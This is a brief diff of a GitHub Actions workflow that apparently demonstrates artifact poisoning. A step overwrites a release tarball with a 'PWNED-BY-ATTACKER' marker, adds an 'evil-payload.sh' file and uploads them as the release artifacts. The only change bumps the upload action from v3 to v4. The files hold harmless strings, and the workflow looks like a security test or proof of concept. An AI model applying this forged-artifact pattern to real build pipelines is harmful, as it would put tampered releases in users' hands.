@@ -13,7 +13,7 @@ jobs:
           echo "PWNED-BY-ATTACKER" > releases/livepeer-task-runner-linux-amd64.tar.gz
           echo "attacker-controlled-extra-file" > releases/evil-payload.sh
       - name: Upload forged artifact
-        uses: actions/upload-artifact@v3
+        uses: actions/upload-artifact@v4
         with:
           name: release-artifacts
           path: releases/
